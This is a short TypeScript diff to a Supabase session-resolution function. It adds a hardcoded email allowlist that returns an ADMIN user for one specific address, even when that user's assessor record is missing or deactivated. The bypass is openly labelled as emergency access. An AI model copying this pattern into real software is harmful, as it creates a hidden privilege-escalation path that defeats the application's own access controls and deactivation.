@@ -1,5 +1,9 @@
 import type { SessionUser } from "./roles";
 
+const EMERGENCY_ADMIN_EMAIL_ALLOWLIST = new Set(
+  ["thepig365@gmail.com"].map((v) => v.toLowerCase())
+);
+
 /**
  * Resolve the authenticated user from the Supabase session cookie.
  *
@@ -30,7 +34,18 @@ export async function resolveSessionUser(): Promise<SessionUser | null> {
       where: { authUid: user.id },
     });
 
-    if (!assessor || !assessor.isActive) return null;
+    if (!assessor || !assessor.isActive) {
+      const normalizedEmail = (user.email ?? "").toLowerCase();
+      if (EMERGENCY_ADMIN_EMAIL_ALLOWLIST.has(normalizedEmail)) {
+        return {
+          id: `allowlist-${user.id}`,
+          authUid: user.id,
+          role: "ADMIN",
+          isActive: true,
+        };
+      }
+      return null;
+    }
 
     return {
       id: assessor.id,
